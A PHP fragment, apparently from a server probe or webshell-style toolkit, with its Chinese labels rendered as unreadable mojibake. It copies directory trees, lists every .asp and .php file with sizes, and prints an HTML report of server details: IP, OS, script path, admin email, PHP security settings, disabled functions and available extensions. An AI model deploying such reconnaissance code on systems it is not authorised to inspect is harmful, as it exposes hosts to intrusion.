    function copy_dir( $old_dir_name,$new_dir_name){
        static $dir_num=0;
        static $file_num=0;
        $d = dir( $old_dir_name);
        while ( false !== ( $entry = $d->read())) {
            if ( $entry=="." or $entry=="..") continue;
            $old = $old_dir_name."/".$entry;
            $new = $new_dir_name."/".$entry;
            if ( is_dir( $old)) {
                if( @mkdir( $new, 0777)){
                    //                echo "�����ļ��� ".$new." �ɹ���<br>";
                    $dir_num++;
                }
                else {
                    echo "<font color=red>�����ļ��� ".$new." ʧ�ܡ�<br></font>";
                    continue;
                }
                copy_dir( $old,$new);
            }
            if ( is_file( $old)) {
                if( @copy( $old,$new)) {
                    //                echo "���� ".$new." �ļ��ɹ���<br>";
                    $file_num++;
                }
                elseif( filesize( $old)==0) {
                    //                echo "<font color=red>���� ". $new." ���ļ���</font><br>";
                    continue;
                }
                else {
                    echo "<font color=red>���� ". $new." �ļ�ʧ�ܡ�</font><br>";
                }
            }
        }
        $tem[] = $dir_num;
        $tem[] = $file_num;
        return $tem;
    }
    //////////
    function list_dir( $dir){
        static $dir_list =0;
        static $file_list =0;
        $d = dir($dir);
        while ( false !== ( $entry = $d->read())) {
            $tem_curnt=$dir."/".$entry;
            if ( $entry=="." or $entry=="..") continue;
            if ( is_dir( $tem_curnt)) {
                $dir_list[] = $tem_curnt;
                list_dir( $tem_curnt);
                echo "<font color=blue>�ļ��� ".$tem_curnt." </font><br>";
                $dir_list++;
            }
            elseif ( is_file($tem_curnt)) {
                if (strtolower(substr($tem_curnt,-4))==".asp"
                or strtolower(substr($tem_curnt,-4))==".php") //�趨��Ҫ��ʾ���ļ�����
                {
                    echo $tem_curnt;
                    $filesize=filesize("$tem_curnt");
                    echo "<font color=red>--->".$filesize."</font><br>";
                    $file_list++;
                }
            }
        }
        $d->close();
        $tem[]=$dir_list;
        $tem[]=$file_list;
        return $tem;
    }
    
    function check() {?>
    <center> ...:::����������:::...
    <TABLE style="BORDER-COLLAPSE: collapse" width="98%" borderColor=#888888  border=0 align=center><tr>
    <td><TABLE style="BORDER-COLLAPSE: collapse" width="98%" borderColor=#888888  border=1 align=center>
    <tr class=mytr align="left">
    <td width="30%">������ʱ��</td>
    <td width="70%"><?php echo date("Y��m��d�� h:s",time()); ?></td>
    </tr>
    
    <tr class=mytr align="left">
    <td >����������</td>
    <td ><?php echo("<a href=\"http://$_SERVER[SERVER_NAME]\"  title=���ʴ����� target=_blank>$_SERVER[SERVER_NAME]</a>"); ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >������IP��ַ</td>
    <td ><?php
    $host_ip=gethostbyname($_SERVER["SERVER_NAME"]);
    echo($host_ip) ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >����������ϵͳ</td>
    <td ><?php echo(PHP_OS); ?> </td>
    </tr>
    <tr class=mytr align=left><td>����������ʱ��</td><td>
    <?
    $phpos=PHP_OS;
    if($phpos=="BSD" || $phpos=="FreeBSD" || $phpos=="Linux" ||$phpos=="NetBSD" || $phpos=="OpenBSD" || $phpos=="Darwin"){
    }else{echo"�Բ���".$phpos."ϵͳ��֧��";}
    ?>
    </td></tr>
    <tr class=mytr align="left">
    <td >����������ϵͳ���ֱ���</td>
    <td ><?php echo($_SERVER["HTTP_ACCEPT_LANGUAGE"]); ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >��������������</td>
    <td ><?php echo($_SERVER["SERVER_SOFTWARE"]); ?></td>
    </tr>
    
    <tr class=mytr align="left">
    <td >Web����˿�</td>
    <td ><?php echo($_SERVER["SERVER_PORT"]); ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >PHP���з�ʽ</td>
    <td >
    <?php echo(strtoupper(php_sapi_name())); ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >PHP�汾</td>
    <td ><?php echo(PHP_VERSION); ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >�����ڰ�ȫģʽ</td>
    <td ><?php if(get_cfg_var("safemode")){echo("��");}else echo("��"); ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >����������Ա</td>
    <td >
    <?php
    if (isset($_SERVER["SERVER_ADMIN"]))
    {
        echo("<a href=\"mailto:$_SERVER[SERVER_ADMIN]\" title=�����ʼ�>$_SERVER[SERVER_ADMIN]</a>");
    }
    else echo("<a href=\"mailto:get_cfg_var(sendmail_from)\" title=�����ʼ�>get_cfg_var(sendmail_from)</a>");
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >���ļ�·��</td>
    <td ><?php echo($_SERVER["PATH_TRANSLATED"]);?>
    </td>
    </tr>
    </table></td>
    </tr>
    </table>
    <br>
    <TABLE style="BORDER-COLLAPSE: collapse" width="98%" borderColor=#888888  border=0 align=center>
    <tr>
    <td><TABLE style="BORDER-COLLAPSE: collapse" width="98%" borderColor=#888888  border=1 align=center>
    <tr class=mytr align="left">
    <td width="70%" >����ʹ��URL���ļ�allow_url_fopen</td>
    <td width="30%" >
    <?php
    if (get_cfg_var("allow_url_fopen")=="1")
    {
        echo("<font color=green><b>��</b></font>");
    }
    else echo("<font color=red><b>��</b></font>");
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >����̬�������ӿ�enable_dl</td>
    <td ><?php
    if (get_cfg_var("enable_dl")=="1")
    {
        echo("<font color=green><b>��</b></font>");
    }
    else echo("<font color=red><b>��</b></font>");
    ?></td>
    </tr>
    <tr class=mytr align="left">
    <td >��ʾ������Ϣdisplay_errors</td>
    <td >
    <?php
    if (get_cfg_var("display_errors")=="1")
    {
        echo("<font color=green><b>��</b></font>");
    }
    else echo("<font color=red><b>��</b></font>");
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >�Զ�����ȫ�ֱ���register_globals</td>
    <td >
    <?php
    if (get_cfg_var("register_globals")=="1")
    {
        echo("<font color=green><b>��</b></font>");
    }
    else echo("<font color=red><b>��</b></font>");
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >�����������ʹ���ڴ���memory_limit</td>
    <td >
    <?php
    echo(get_cfg_var("memory_limit"));
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >POST����ֽ���post_max_size</td>
    <td >
    <?php
    echo(get_cfg_var("post_max_size"));
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >��������ϴ��ļ�upload_max_filesize</td>
    <td >
    <?php
    if (get_cfg_var("file_uploads")=="1")
    {
        echo(get_cfg_var("upload_max_filesize"));
    }
    else echo("�������ϴ�");
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >���������ʱ��max_execution_time</td>
    <td >
    <?php
    echo(get_cfg_var("max_execution_time")."��");
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >�����õĺ���disable_functions</td>
    <td >
    <?php
    $dis_func=get_cfg_var("disable_functions");
    if ($dis_func=="")
    {
        echo("<font color=red><b>��</b></font>");
    }
    else
    {
        $dis_func=str_replace(" ","<br>",$dis_func);
        $dis_func=str_replace(",","<br>",$dis_func);
        echo("$dis_func");
    }
    ?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >PHP��ϢPHPINFO</td>
    <td >
    <?php if(ereg("phpinfo",$dis_func)){echo "<font color=red><b>��</b></font>";}else{echo "<font color=green><b>��</b></font><a href=$PHP_SELF?action=info title=��˲鿴PHPINFOϸ��Ϣ>PHPINFO</a>";}?>
    </td>
    </tr>
    <tr class=mytr align="left">
    <td >Ŀǰ���п���ռ�diskfreespace</td>
    <td >
    <?echo intval(diskfreespace(".") / (1024 * 1024)).'Mb';?>
    </td>
    </tr>
    
    </table></td>
    </tr>
    </table>
    <br> </center>
    ������
    <?
    echo getenv("SERVER_SOFTWARE");
    if (function_exists("gzopen"))echo "<br>Zlib����";
    if (function_exists("imageline"))echo " GD����";
    if (function_exists("fsockopen"))echo " Socket����";
    if (function_exists("session_start"))echo " Session����";
    if (function_exists("ftp_login"))echo " FTP����";
    echo "<br>��ȫģʽ";
    if (get_cfg_var("safe_mode"))echo "(��)";
    else echo"(�ر�)";
    echo " ��ʱ(".get_cfg_var("max_execution_time")."��)";
    echo " ���ô�С(";
    echo intval(diskfreespace("/") / (1024*1024))."Mb)";
    echo " ���ļ����ֵ(".get_cfg_var("upload_max_filesize").')';
    ?>
    <br> <br>
    <?}   ?>